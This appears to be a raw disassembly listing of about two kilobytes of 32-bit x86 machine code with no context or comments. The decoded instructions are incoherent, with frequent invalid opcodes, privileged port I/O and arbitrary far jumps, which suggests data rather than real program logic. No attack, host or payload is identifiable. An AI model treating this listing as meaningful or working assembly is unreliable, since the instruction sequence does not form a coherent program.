  415e0a:	inc    esi
  415e0b:	mov    edx,0x4061a210
  415e10:	pop    esp
  415e11:	(bad)  
  415e12:	loope  0x415da6
  415e14:	xchg   ebx,eax
  415e15:	push   0x3e
  415e17:	and    cl,cl
  415e19:	pop    esp
  415e1a:	cmp    eax,0xc4234e7b
  415e1f:	mov    ds:0x5eec4c0c,al
  415e24:	and    eax,0x394c9fdf
  415e29:	jmp    0x6a8a05e8
  415e2e:	(bad)  
  415e2f:	pop    ebx
  415e30:	jl     0x415dce
  415e32:	add    BYTE PTR [edx+eiz*2-0x26],0x7f
  415e37:	les    ebp,FWORD PTR [edi+0x21]
  415e3a:	push   eax
  415e3b:	inc    edi
  415e3c:	fistp  WORD PTR [ebx-0x18df19ee]
  415e42:	sbb    al,al
  415e44:	aad    0xee
  415e46:	pusha  
  415e47:	test   eax,0x49ea806a
  415e4c:	pop    esi
  415e4d:	test   eax,0xe8231529
  415e53:	jo     0x415dda
  415e55:	mov    ecx,0xf60870de
  415e5a:	mov    ah,0x20
  415e5c:	push   esp
  415e5d:	inc    edi
  415e5e:	jb     0x415de8
  415e60:	and    BYTE PTR [ebx+edx*4+0x78],0x2
  415e65:	xchg   ebp,eax
  415e66:	pop    esi
  415e67:	fs stos DWORD PTR es:[edi],eax
  415e69:	pop    ecx
  415e6a:	jecxz  0x415ea2
  415e6c:	out    0xad,al
  415e6e:	mov    ch,0xfd
  415e70:	js     0x415e90
  415e72:	xor    ch,bh
  415e74:	inc    esp
  415e75:	mov    WORD PTR [eax-0x3600e6c4],?
  415e7b:	test   DWORD PTR [ebx],esp
  415e7d:	mov    eax,0x32b7e9cc
  415e82:	cmp    ah,BYTE PTR [ebx+ecx*2+0x4fc8a83a]
  415e89:	push   ds
  415e8a:	call   0x6b06899e
  415e8f:	push   eax
  415e90:	inc    edx
  415e91:	mov    BYTE PTR [edx-0x24],bh
  415e94:	mov    ds:0xebe69845,eax
  415e99:	jnp    0x415eba
  415e9b:	sub    BYTE PTR [eax-0x4f],dl
  415e9e:	fimul  DWORD PTR [eax+0x71]
  415ea1:	mov    ebp,0xb01c00c9
  415ea6:	sub    edi,esi
  415ea8:	inc    ebp
  415ea9:	jno    0x415e6a
  415eab:	inc    edx
  415eac:	into   
  415ead:	sub    ah,bh
  415eaf:	push   eax
  415eb0:	jp     0x415e73
  415eb2:	pop    ebp
  415eb3:	js     0x415eb3
  415eb5:	inc    esi
  415eb6:	add    esp,DWORD PTR [eax+0x4bac06b0]
  415ebc:	add    al,0x89
  415ebe:	aad    0x5d
  415ec0:	mov    ebp,DWORD PTR [eax+0x2fa15a7c]
  415ec6:	arpl   WORD PTR [edx-0x768e42d2],sp
  415ecc:	call   DWORD PTR [ebx+0x5e00ca6d]
  415ed2:	xlat   BYTE PTR ds:[ebx]
  415ed3:	jo     0x415e6d
  415ed5:	scas   al,BYTE PTR es:[edi]
  415ed6:	loop   0x415ed2
  415ed8:	dec    esi
  415ed9:	cmp    DWORD PTR [edi+esi*1-0x2e],eax
  415edd:	mov    BYTE PTR [ebx-0x8],0x99
  415ee1:	jg     0x415f05
  415ee3:	xchg   esp,eax
  415ee4:	gs clc 
  415ee6:	es stos BYTE PTR es:[edi],al
  415ee8:	mov    ds:0x1201544,eax
  415eed:	sub    DWORD PTR [ebx-0x3e],ebp
  415ef0:	fidiv  WORD PTR [esi-0x23219550]
  415ef6:	stos   DWORD PTR es:[edi],eax
  415ef7:	iret   
  415ef8:	cmp    DWORD PTR [ecx-0x8],ebx
  415efb:	dec    edx
  415efc:	into   
  415efd:	dec    ebp
  415efe:	add    BYTE PTR [ebp+esi*4-0x70e799fd],dh
  415f05:	inc    esi
  415f06:	jbe    0x415f53
  415f08:	mov    esi,0x43f9a812
  415f0d:	outs   dx,DWORD PTR ds:[esi]
  415f0e:	call   0x549df5ef
  415f13:	call   0xb3316734
  415f18:	add    ebx,ecx
  415f1a:	lock jnp 0x415f44
  415f1d:	mov    ds:0xf1b03f00,al
  415f22:	pop    eax
  415f23:	push   esp
  415f24:	sub    cl,BYTE PTR [edx+0x7716aa48]
  415f2a:	dec    ecx
  415f2b:	arpl   WORD PTR [eax],bx
  415f2d:	sub    BYTE PTR [ebx],ch
  415f2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f30:	or     al,BYTE PTR [eax+ebp*8+0x0]
  415f34:	and    eax,0x204591bd
  415f39:	pop    esp
  415f3a:	cmp    BYTE PTR [esi],ah
  415f3c:	pusha  
  415f3d:	fsubp  st(5),st
  415f3f:	mov    edx,0x52dde730
  415f44:	jmp    0xa067:0xdd7608e1
  415f4b:	and    eax,0xe074d380
  415f50:	iret   
  415f51:	mov    bh,0x6
  415f53:	adc    al,BYTE PTR [edx+0x44]
  415f56:	shr    ebp,cl
  415f58:	pop    es
  415f59:	push   ebp
  415f5a:	or     DWORD PTR [ebp+0x70],0x4f
  415f5e:	sbb    eax,0xbd0781e8
  415f63:	mov    al,ds:0x1a126ffe
  415f68:	add    esp,DWORD PTR [ecx-0x6c]
  415f6b:	inc    edi
  415f6c:	popf   
  415f6d:	rol    BYTE PTR [esi-0x325d4720],1
  415f73:	ds push es
  415f75:	xor    ah,BYTE PTR [eax]
  415f77:	outs   dx,BYTE PTR ds:[esi]
  415f78:	and    DWORD PTR [eax],ebx
  415f7a:	aas    
  415f7b:	sbb    BYTE PTR [eax+eax*2],cl
  415f7e:	rcl    eax,cl
  415f80:	imul   esi,DWORD PTR [ecx+0x26],0x6974a123
  415f87:	xchg   esp,eax
  415f88:	mov    esi,0xe01e30f1
  415f8d:	fbld   TBYTE PTR [bp+di]
  415f90:	jae    0x415f62
  415f92:	mov    dl,BYTE PTR [ebp-0x3a90e0c7]
  415f98:	sbb    BYTE PTR [eax],ch
  415f9a:	lods   eax,DWORD PTR ds:[esi]
  415f9b:	inc    esi
  415f9c:	push   0x1b3f5bbe
  415fa1:	mov    dl,bl
  415fa3:	sbb    ah,BYTE PTR [eax]
  415fa5:	or     DWORD PTR [edi-0x41],ecx
  415fa8:	jbe    0x41601c
  415faa:	dec    esi
  415fab:	adc    al,0xe6
  415fad:	imul   al
  415faf:	ss jp  0x415fec
  415fb2:	das    
  415fb3:	(bad)  [esi-0x65]
  415fb6:	in     al,dx
  415fb7:	inc    esi
  415fb8:	(bad)  
  415fb9:	sti    
  415fba:	int    0x74
  415fbc:	arpl   WORD PTR [esi],ax
  415fbe:	add    BYTE PTR [eax],ch
  415fc0:	rcl    DWORD PTR [esi],1
  415fc2:	sub    BYTE PTR [ecx+0x488893f4],al
  415fc8:	pop    ecx
  415fc9:	push   ebx
  415fca:	cmp    al,0x41
  415fcc:	into   
  415fcd:	sub    eax,0x3796932c
  415fd2:	ins    BYTE PTR es:[edi],dx
  415fd3:	dec    BYTE PTR [eax-0x9]
  415fd6:	inc    edx
  415fd7:	aad    0x8
  415fd9:	gs push edx
  415fdb:	fwait
  415fdc:	sub    bh,BYTE PTR [eax]
  415fde:	mov    esp,0xcc5d8e11
  415fe3:	mov    DWORD PTR [eax-0x1c9adbd5],edi
  415fe9:	xor    al,0x9
  415feb:	mov    edi,0xed384f74
  415ff0:	xor    eax,0xc98825ef
  415ff5:	mov    eax,ds:0x6a6b2da6
  415ffa:	jns    0x415ff5
  415ffc:	hlt    
  415ffd:	lock popw es
  416000:	jle    0x415f88
  416002:	nop
  416003:	cwde   
  416004:	jne    0x416015
  416006:	test   BYTE PTR [ecx+0x1339445a],0x8e
  41600d:	inc    eax
  41600e:	dec    DWORD PTR [eax-0x391bcefa]
  416014:	jmpw   0x8baa
  416018:	push   ebp
  416019:	and    eax,0xe8937e58
  41601e:	mov    ah,0xb
  416020:	mov    al,ds:0x9ab1d6cd
  416025:	push   ss
  416026:	mov    dh,0xaa
  416028:	xchg   ebx,eax
  416029:	jns    0x41605c
  41602b:	cmp    al,0x5e
  41602d:	xchg   esi,eax
  41602e:	pop    ebx
  41602f:	ret    
  416030:	sbb    dl,BYTE PTR [ecx+ecx*4-0x7872a8e7]
  416037:	add    edx,0x297d166a
  41603d:	repnz adc esi,0xade3762c
  416044:	in     eax,0x55
  416046:	jmp    0x4be5:0x529e4160
  41604d:	les    esi,FWORD PTR [esi+0x6f]
  416050:	or     BYTE PTR [ecx],0xd3
  416053:	push   edi
  416054:	sub    eax,ebp
  416056:	inc    edx
  416057:	in     eax,0x81
  416059:	sti    
  41605a:	test   eax,0xabf778d2
  41605f:	test   al,0x56
  416061:	std    
  416062:	icebp  
  416063:	or     BYTE PTR [esi],bh
  416065:	loopne 0x416029
  416067:	outs   dx,BYTE PTR ds:[esi]
  416068:	jmp    0x4d748637
  41606d:	(bad)  
  41606e:	scas   eax,DWORD PTR es:[edi]
  41606f:	ins    BYTE PTR es:[edi],dx
  416070:	xor    esp,DWORD PTR [edi-0x3261d8ad]
  416076:	pop    edx
  416077:	leave  
  416078:	cmc    
  416079:	aam    0xdb
  41607b:	and    dl,0x1b
  41607e:	sbb    eax,0x50c891fd
  416083:	ins    DWORD PTR es:[edi],dx
  416084:	pop    ebx
  416085:	pop    ebp
  416086:	daa    
  416087:	push   edx
  416088:	jl     0x4160bd
  41608a:	cdq    
  41608b:	int    0x37
  41608d:	stc    
  41608e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41608f:	bound  ebx,QWORD PTR [ebx-0x76]
  416092:	test   al,0x59
  416094:	push   edx
  416095:	mov    ebx,0xd9fee641
  41609a:	mov    bh,0xca
  41609c:	gs pop edi
  41609e:	ffree  st(4)
  4160a0:	subps  xmm7,XMMWORD PTR [eax+0x4ec9bc3c]
  4160a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160a8:	pushf  
  4160a9:	(bad)  
  4160aa:	jle    0x41606a
  4160ac:	rcl    DWORD PTR [ebp-0x54],0xbc
  4160b0:	jns    0x41612c
  4160b2:	mov    ebp,0xfd5cf5af
  4160b7:	xor    al,0x3b
  4160b9:	punpckldq mm0,DWORD PTR [eax-0x72]
  4160bd:	dec    eax
  4160be:	ss pop es
  4160c0:	test   edx,edx
  4160c2:	push   ss
  4160c3:	xor    DWORD PTR [esi-0x51],0x3a
  4160c7:	sub    DWORD PTR [esp+eax*4+0x6c],edi
  4160cb:	or     esp,DWORD PTR [ebp-0x46]
  4160ce:	(bad)  
  4160cf:	push   edx
  4160d0:	cld    
  4160d1:	add    DWORD PTR [esi+0x111dcbce],0x58c80e04
  4160db:	cli    
  4160dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160dd:	or     dl,bl
  4160df:	mov    BYTE PTR [esi-0x62dc5465],bl
  4160e5:	pop    es
  4160e6:	fnsave [ecx+0x10d7a5a0]
  4160ec:	push   cs
  4160ed:	xor    ah,al
  4160ef:	or     ebx,DWORD PTR [ebx-0x5c]
  4160f2:	mov    bl,0x9f
  4160f4:	retf   
  4160f5:	rcr    BYTE PTR [ebx-0x722ad105],1
  4160fb:	pop    ss
  4160fc:	push   eax
  4160fd:	(bad)  
  4160fe:	ss out dx,eax
  416100:	loop   0x416085
  416102:	lahf   
  416103:	into   
  416104:	adc    eax,0x48873ee1
  416109:	cwde   
  41610a:	mov    esp,0xd1df1a2e
  41610f:	loopne 0x416125
  416111:	bound  ax,DWORD PTR [edx+0x34f4e786]
  416118:	loope  0x4160d9
  41611a:	mov    ah,0xeb
  41611c:	shl    DWORD PTR [esp+ebx*2+0x65],0xc8
  416121:	xor    eax,0xb33a38c3
  416126:	icebp  
  416127:	mov    esi,0xe038658b
  41612c:	sbb    ebx,DWORD PTR [ebx-0x5f]
  41612f:	mov    DWORD PTR [ebp+0xf],ebp
  416132:	fsubp  st(6),st
  416134:	mov    ah,0x32
  416136:	aad    0x1d
  416138:	add    BYTE PTR [esi+0x9de390f],bh
  41613e:	std    
  41613f:	xor    ebx,DWORD PTR [ebx-0x6e]
  416142:	mov    dl,0x32
  416144:	mov    DWORD PTR [eax-0x76],ebp
  416147:	cdq    
  416148:	ror    DWORD PTR [edx-0x20],0x69
  41614c:	mov    edx,0x99db422f
  416151:	mov    ecx,0x9700d5db
  416156:	(bad)  
  416157:	sbb    dh,ch
  416159:	(bad)  
  41615a:	ficomp DWORD PTR [esi+0x6b]
  41615d:	mov    edx,esp
  41615f:	retf   0xb36f
  416162:	(bad)  
  416163:	cwde   
  416164:	popa   
  416165:	in     eax,0x2f
  416167:	dec    edx
  416168:	xor    bl,BYTE PTR [ebp+ebx*2-0x39818614]
  41616f:	fs nop
  416171:	xchg   ebp,eax
  416172:	ret    
  416173:	sbb    ah,BYTE PTR [eax]
  416175:	jge    0x41614b
  416177:	in     al,dx
  416178:	jp     0x4161c9
  41617a:	push   eax
  41617b:	pusha  
  41617c:	iret   
  41617d:	lods   al,BYTE PTR ds:[esi]
  41617e:	xchg   edx,eax
  41617f:	jne    0x41619c
  416181:	push   ecx
  416182:	je     0x4161d3
  416184:	pop    edx
  416185:	adc    DWORD PTR [ebx+ecx*8+0x14ef4172],ecx
  41618c:	jns    0x4161f0
  41618e:	cmp    cl,BYTE PTR [eax+0x2b]
  416191:	leave  
  416192:	out    dx,eax
  416193:	(bad)  
  416194:	test   eax,0x767df48
  416199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41619a:	sub    ecx,DWORD PTR [esi+0x4f12d8a]
  4161a0:	ja     0x4161e4
  4161a2:	add    BYTE PTR [esi],cl
  4161a4:	and    DWORD PTR [ecx+0x19],ebx
  4161a7:	sti    
  4161a8:	xor    edx,DWORD PTR [eax+eax*4+0x72]
  4161ac:	dec    ecx
  4161ad:	js     0x416133
  4161af:	sbb    eax,0x21ea0964
  4161b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161b5:	sbb    ecx,DWORD PTR [esp+eax*2-0x13]
  4161b9:	jo     0x41614a
  4161bb:	xor    al,BYTE PTR [eax+0x700a9f]
  4161c1:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4161c3:	nop
  4161c4:	retf   0xf762
  4161c7:	pop    ss
  4161c8:	repz sahf 
  4161ca:	stos   BYTE PTR es:[edi],al
  4161cb:	cmp    BYTE PTR [edx+0x5c15246f],ch
  4161d1:	pop    edx
  4161d2:	hlt    
  4161d3:	cmc    
  4161d4:	dec    ebp
  4161d5:	add    eax,0xab3c9c5e
  4161da:	lock mov al,gs:0xdf8d1584
  4161e1:	outs   dx,BYTE PTR ds:[esi]
  4161e2:	xchg   DWORD PTR [ecx+0x569c8d32],ebx
  4161e8:	xchg   esp,eax
  4161e9:	add    eax,0x8a0effda
  4161ee:	fbstp  TBYTE PTR [esi+ebp*1+0x29]
  4161f2:	sub    bl,BYTE PTR [ecx+0x34]
  4161f5:	sahf   
  4161f6:	jmp    0x722f:0x5a6d259c
  4161fd:	xchg   ecx,eax
  4161fe:	pop    ebp
  4161ff:	jle    0x4161cf
  416201:	aaa    
  416202:	xchg   esi,eax
  416203:	js     0x4161c6
  416205:	jl     0x41619a
  416207:	add    eax,DWORD PTR [edi+0x19]
  41620a:	(bad)  
  41620b:	frstor [edx]
  41620d:	and    edi,0x8106650d
  416213:	leave  
  416214:	lea    esp,ds:0x86ba47f8
  41621a:	ds mov ?,eax
  41621d:	xor    eax,0x85f1703f
  416222:	mov    esi,0xa2aef8d9
  416227:	mov    bh,0xe3
  416229:	in     al,0xd
  41622b:	mov    eax,0x503b779b
  416230:	cwde   
  416231:	mov    bh,0x1a
  416233:	(bad)  
  416234:	mov    ds:0x61b4bbfc,al
  416239:	push   esp
  41623a:	out    0x32,eax
  41623c:	sub    eax,0x89162645
  416241:	mov    ?,WORD PTR [ecx-0x7ac50de0]
  416247:	loopne 0x416208
  416249:	mov    al,ds:0x53d7dcb4
  41624e:	jge    0x416204
  416250:	add    esp,ebp
  416252:	popf   
  416253:	in     al,0xdf
  416255:	aaa    
  416256:	mov    ebp,0x9a81b89c
  41625b:	mov    ah,BYTE PTR [ebp-0x4d5b17c4]
  416261:	adc    al,0x81
  416263:	push   edx
  416264:	pop    edi
  416265:	dec    ebp
  416266:	repnz aam 0x88
  416269:	pop    eax
  41626a:	dec    ebp
  41626b:	cmp    edi,DWORD PTR [ecx-0x386d29b4]
  416271:	pop    esp
  416272:	adc    DWORD PTR [ebx+ebp*2-0x484f1d92],ecx
  416279:	mov    cl,dl
  41627b:	inc    edi
  41627c:	je     0x41628f
  41627e:	in     eax,dx
  41627f:	ins    DWORD PTR es:[edi],dx
  416280:	push   edi
  416281:	or     edx,DWORD PTR ds:0xa16324dc
  416287:	pop    edi
  416288:	xor    bh,dl
  41628a:	add    edi,DWORD PTR [edx-0x363aedf]
  416290:	jmp    0x8693:0x8ccf6598
  416297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416298:	jecxz  0x41623b
  41629a:	and    DWORD PTR [esi-0x5b],0x8
  41629e:	push   edx
  41629f:	mov    eax,ds:0xad5f192c
  4162a4:	aad    0x15
  4162a6:	loope  0x41625b
  4162a8:	or     dh,dh
  4162aa:	jo     0x41630e
  4162ac:	cmp    DWORD PTR [ecx],esi
  4162ae:	inc    ebx
  4162af:	xchg   DWORD PTR [ebp+0x5be80641],edi
  4162b5:	retf   0xf458
  4162b8:	and    al,0x26
  4162ba:	or     bh,BYTE PTR [edx-0x53]
  4162bd:	(bad)  
  4162be:	or     esp,DWORD PTR [esp+eax*2+0x56e217dc]
  4162c5:	mov    bh,0x11
  4162c7:	ror    ebx,0x3f
  4162ca:	out    dx,al
  4162cb:	imul   edx,DWORD PTR [edx+ecx*4-0x787fa291],0x1060feb7
  4162d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162d7:	cmp    edx,DWORD PTR [ebx-0x4f98c2be]
  4162dd:	test   BYTE PTR [edi+0x41a346e7],al
  4162e3:	inc    edx
  4162e4:	cmp    al,0xbd
  4162e6:	gs dec esi
  4162e8:	popa   
  4162e9:	dec    ebx
  4162ea:	pusha  
  4162eb:	mov    esi,0x7c2d965b
  4162f0:	lahf   
  4162f1:	lock or DWORD PTR [edi+0x241616d7],0xbf5007bb
  4162fc:	int    0xdd
  4162fe:	or     bh,dh
  416300:	fmul   DWORD PTR [ecx]
  416302:	push   edi
  416303:	xor    DWORD PTR [esp+ebx*4+0x7],edi
  416307:	mov    BYTE PTR [edx+eiz*8],cl
  41630a:	sbb    eax,0x1b1f6b54
  41630f:	or     bl,BYTE PTR [eax-0x3b3683cf]
  416315:	pop    edi
  416316:	jne    0x4162bd
  416318:	jo     0x4162e1
  41631a:	push   esp
  41631b:	mov    DWORD PTR [edi],eax
  41631d:	(bad)  
  41631f:	sub    al,0xaf
  416321:	xor    esp,DWORD PTR [edi]
  416323:	out    dx,al
  416324:	loop   0x416399
  416326:	add    bl,BYTE PTR [ebp+0x7ad9e846]
  41632c:	mov    bh,0x47
  41632e:	pop    ss
  41632f:	xchg   BYTE PTR [ebx+0x7],dl
  416332:	inc    eax
  416333:	or     ebx,eax
  416335:	loope  0x4162b7
  416337:	in     eax,dx
  416338:	sbb    al,0x55
  41633a:	jp     0x4162eb
  41633c:	fucomip st,st(5)
  41633e:	mov    dh,0xf0
  416340:	sbb    al,BYTE PTR [ecx+0x5e]
  416343:	sbb    BYTE PTR [edx],0xb6
  416346:	push   eax
  416347:	mov    DWORD PTR [ebp-0x6e],edx
  41634a:	sbb    BYTE PTR [ecx],0x33
  41634d:	stos   DWORD PTR es:[edi],eax
  41634e:	cld    
  41634f:	clc    
  416350:	mov    BYTE PTR [edx-0x76],ch
  416353:	out    0xd4,al
  416355:	mov    bl,0x36
  416357:	stos   BYTE PTR es:[edi],al
  416358:	gs push ss
  41635a:	inc    edi
  41635b:	and    DWORD PTR [eax],esi
  41635d:	pop    ebp
  41635e:	xchg   edx,eax
  41635f:	call   0xa6c5:0x7ab56360
  416366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416367:	dec    ecx
  416368:	mov    ebp,0x30b677ee
  41636d:	shr    DWORD PTR [esp+edx*1],cl
  416370:	jnp    0x41635f
  416372:	and    al,dh
  416374:	repnz xchg ebp,eax
  416376:	out    dx,eax
  416377:	mov    eax,0xb67481e
  41637c:	and    al,0x5b
  41637e:	(bad)  
  416380:	mov    ds:0x9e9c905c,eax
  416385:	dec    edx
  416386:	and    al,0x95
  416388:	adc    eax,0x99272749
  41638d:	retf   
  41638e:	in     al,0x45
  416390:	out    dx,al
  416391:	push   ebx
  416392:	ja     0x41640b
  416394:	enter  0x953a,0x3c
  416398:	jne    0x416325
  41639a:	pusha  
  41639b:	dec    ecx
  41639c:	repnz fwait
  41639e:	out    dx,eax
  41639f:	adc    dh,ah
  4163a1:	mov    ebp,0x2aec58ad
  4163a6:	xor    DWORD PTR [edi+0x66],esp
  4163a9:	push   esi
  4163aa:	sbb    eax,0xb179250e
  4163af:	test   al,0xac
  4163b1:	pop    edx
  4163b2:	xor    eax,0x5462a98d
  4163b7:	pop    ecx
  4163b8:	jmp    0x41636f
  4163ba:	jns    0x416380
  4163bc:	xor    dh,dh
  4163be:	lds    bx,DWORD PTR [edi]
  4163c1:	mov    edi,0xf22e8233
  4163c6:	mov    ch,0x93
  4163c8:	lock sub eax,0xb78a34e4
  4163ce:	dec    eax
  4163cf:	inc    edx
  4163d0:	cmp    ebx,edi
  4163d2:	in     al,dx
  4163d3:	jae    0x4163c5
  4163d5:	jg     0x4163d0
  4163d7:	xor    eax,0x1c8bb6c5
  4163dc:	or     al,0xf5
  4163de:	test   eax,0xdf9b0783
  4163e3:	or     BYTE PTR [ebp+eiz*4+0xd],cl
  4163e7:	lods   eax,DWORD PTR ds:[esi]
  4163e8:	mov    edx,0x24ff569f
  4163ed:	ror    BYTE PTR [ebx],cl
  4163ef:	push   es
  4163f0:	repnz adc al,0x1a
  4163f3:	mov    ds:0x703f39d5,al
  4163f8:	jg     0x41641e
  4163fa:	sti    
  4163fb:	mov    ecx,0xa9a515e
  416400:	add    cl,BYTE PTR [ebx+0x10]
  416403:	mov    dh,0x5c
  416405:	or     al,BYTE PTR [edx+0x3a]
  416408:	add    ecx,DWORD PTR [edx+0x14]
  41640b:	stos   BYTE PTR es:[edi],al
  41640c:	jb     0x416405
  41640e:	dec    ebp
  41640f:	add    DWORD PTR [ebp+edx*2+0x31],esi
  416413:	xor    eax,0xc91e90a4
  416418:	fnstsw WORD PTR [edx+ebx*8-0x34]
  41641c:	lea    esp,[esi+eax*8]
  41641f:	into   
  416420:	xor    BYTE PTR [edi+eax*8+0x5c33de37],dl
  416427:	mov    esp,0xdc2990c
  41642c:	ret    0xe5f1
  41642f:	jmp    0x4163ba
  416431:	push   edx
  416432:	or     DWORD PTR [ebx-0x3736050],esp
  416438:	inc    ebp
  416439:	sbb    DWORD PTR [ebp-0x28],ebp
  41643c:	mov    dl,0x4a
  41643e:	sbb    BYTE PTR [ebx+0x547ad195],bl
  416444:	es jb  0x41647d
  416447:	xor    eax,DWORD PTR [ebp-0x58]
  41644a:	mov    eax,DWORD PTR [eax-0x6dc2ebed]
  416450:	std    
  416451:	lds    eax,FWORD PTR [edx-0x7e]
  416454:	mov    edi,0xd32ec9b
  416459:	adc    BYTE PTR [edi],dh
  41645b:	or     ebp,DWORD PTR [esi+0x3bf7bdbb]
  416461:	push   eax
  416462:	xchg   ebp,eax
  416463:	push   ds
  416464:	fistp  QWORD PTR [esi]
  416466:	jle    0x4164e4
  416468:	stos   BYTE PTR es:[edi],al
  416469:	inc    eax
  41646a:	add    al,0x88
  41646c:	or     DWORD PTR [eax+0x28],esp
  41646f:	test   DWORD PTR [esi+0x56943fb0],eax
  416475:	sub    ch,BYTE PTR [ecx+0x6c0000d3]
  41647b:	or     al,0x67
  41647d:	in     eax,dx
  41647e:	add    BYTE PTR [ebp-0x1a727663],ch
  416484:	test   BYTE PTR [edi+eiz*1+0x7e4ded09],dl
  41648b:	xor    eax,0x6398784f
  416490:	data16 int3 
  416492:	mov    dl,0x1
  416494:	pop    ss
  416495:	in     al,0x99
  416497:	lahf   
  416498:	pop    edi
  416499:	(bad)  
  41649a:	mov    ds:0x147ddee2,eax
  41649f:	stc    
  4164a0:	add    eax,0xa6d0b98b
  4164a5:	ins    DWORD PTR es:[edi],dx
  4164a6:	pop    ecx
  4164a7:	pop    ds
  4164a8:	add    ch,BYTE PTR [esi+0x4b]
  4164ab:	sbb    bh,BYTE PTR [ebx+edi*4+0x35559d9e]
  4164b2:	(bad)  
  4164b3:	fcom   QWORD PTR [edi+0x60]
  4164b6:	xchg   BYTE PTR [ebx],ch
  4164b8:	inc    esp
  4164b9:	je     0x4164a6
  4164bb:	mov    ah,0x28
  4164bd:	repz jb 0x4164a2
  4164c0:	sti    
  4164c1:	stos   BYTE PTR es:[edi],al
  4164c2:	fs scas al,BYTE PTR es:[edi]
  4164c4:	xchg   BYTE PTR [ecx-0x4b839aa9],bh
  4164ca:	push   ebx
  4164cb:	pop    ds
  4164cc:	pop    edx
  4164cd:	mov    ebx,gs
  4164cf:	aas    
  4164d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164d1:	test   BYTE PTR [edi],bh
  4164d3:	mov    al,0xbb
  4164d5:	or     esi,DWORD PTR [eax+0x4923a84b]
  4164db:	(bad)  
  4164dd:	sub    eax,0xd95bb097
  4164e2:	call   0x2a64:0xebb467c9
  4164e9:	popf   
  4164ea:	push   0x5098e08
  4164ef:	sahf   
  4164f0:	or     al,0x5
  4164f2:	cmp    BYTE PTR [ecx+0x1effbf63],ah
  4164f8:	push   es
  4164f9:	fcmovne st,st(0)
  4164fb:	dec    ecx
  4164fc:	sbb    BYTE PTR [edi+edi*8],0x9c
  416500:	xor    DWORD PTR [ebx+0x43],ebx
  416503:	xchg   esp,eax
  416504:	in     al,dx
  416505:	xchg   DWORD PTR [bp+di-0x1f40],ebp
  41650a:	dec    ecx
  41650b:	in     eax,0x68
  41650d:	(bad)  
  41650e:	dec    esp
  41650f:	outs   dx,DWORD PTR ds:[esi]
  416510:	into   
  416511:	mov    bl,0x7b
  416513:	ja     0x416543
  416515:	jae    0x416518
  416517:	loope  0x4164b5
  416519:	lods   al,BYTE PTR ds:[esi]
  41651a:	ret    0x55a0
  41651d:	(bad)  
  41651f:	mov    ?,esi
  416521:	pop    edx
  416522:	stc    
  416523:	mov    dh,0x29
  416525:	cmp    dl,dl
  416527:	inc    edi
  416528:	les    edx,FWORD PTR [esp+ecx*1-0x60]
  41652c:	aas    
  41652d:	in     al,0x91
  41652f:	test   eax,0x187b0141
  416534:	mov    DWORD PTR [edi],0x8e55ebf2
  41653a:	xor    al,0xcc
  41653c:	ror    BYTE PTR [ebx],cl
  41653e:	hlt    
  41653f:	loop   0x416571
  416541:	push   eax
  416542:	retf   
  416543:	sub    BYTE PTR [edi+eiz*8],al
  416546:	je     0x41651d
  416548:	push   0xb
  41654a:	inc    esp
  41654b:	test   al,0x20
  41654d:	ret    0x9f45
  416550:	pusha  
  416551:	sbb    eax,0xb5c08b9e
  416556:	lds    ebx,FWORD PTR [ebx]
  416558:	rol    bl,0xa7
  41655b:	mov    ah,0x9a
  41655d:	pop    ebx
  41655e:	loop   0x416516
  416560:	in     eax,dx
  416561:	fldenv [edi]
  416563:	dec    esp
  416564:	push   ds
  416565:	popa   
  416566:	sbb    DWORD PTR [esp+edx*4-0x6e],ecx
  41656a:	enter  0xe4a3,0x40
  41656e:	out    0xe4,al
  416570:	push   ds
  416571:	add    DWORD PTR [ebp-0x4a],edi
  416574:	fs retf 
  416576:	loope  0x416572
  416578:	pop    ecx
  416579:	cwde   
  41657a:	(bad)  
  41657b:	mov    ch,0x67
  41657d:	mov    ds,WORD PTR [eax-0x6a]
  416580:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416581:	mov    eax,ds:0x948db6b3
  416586:	ficom  DWORD PTR [edi]
  416588:	(bad)  [edx]
  41658a:	sub    DWORD PTR [edi],ecx
  41658c:	repz test BYTE PTR [ebp+0x489a8ffa],cl
  416593:	stos   DWORD PTR es:[edi],eax
  416594:	sbb    DWORD PTR [esi-0x3f],edi
  416597:	out    dx,eax
  416598:	js     0x41656b
  41659a:	xchg   esi,eax
  41659b:	push   edx
  41659c:	sub    ch,BYTE PTR [ebp-0xdb23db9]
  4165a2:	xchg   ecx,eax
  4165a3:	lods   eax,DWORD PTR ds:[esi]
  4165a4:	je     0x4165d4
  4165a6:	mov    BYTE PTR [eax+0x1da1fb91],al
  4165ac:	mov    al,ds:0xc6fdf915
  4165b1:	out    0xb3,eax
  4165b3:	call   0x19b2:0x4c4a291c
  4165ba:	sar    ah,0x19
  4165bd:	adc    BYTE PTR [edi+0xe],dl
  4165c0:	imul   ebx,DWORD PTR [ebp+eiz*1-0x57],0xb5645fdf
  4165c8:	mov    edx,0xacb0b210
  4165cd:	sub    edi,edi
  4165cf:	repnz mov ch,0xc
  4165d2:	pop    ebx
  4165d3:	ds mov ebp,0x8958c7f0
  4165d9:	not    esi
  4165db:	(bad)  
  4165dc:	mov    ebp,0x2ac841ae
  4165e1:	arpl   WORD PTR [esi-0x35250dba],dx
  4165e7:	pop    edi
  4165e8:	(bad)  
  4165e9:	cmp    al,0xdd
  4165eb:	loop   0x416651
  4165ed:	out    dx,eax
  4165ee:	adc    ah,BYTE PTR ds:0x7acbc381
  4165f4:	daa    
  4165f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165f6:	push   esi
  4165f7:	pop    eax
  4165f8:	jns    0x41658c
  4165fa:	push   0x76
  4165fc:	xor    eax,0x111ca216
  416601:	sub    BYTE PTR [edi+0x1],0xd1
  416605:	pop    ss
  416606:	jnp    0x4165be
  416608:	xor    BYTE PTR [ebx+0x5c],ah
  41660b:	mov    ds:0xa3dab47d,al
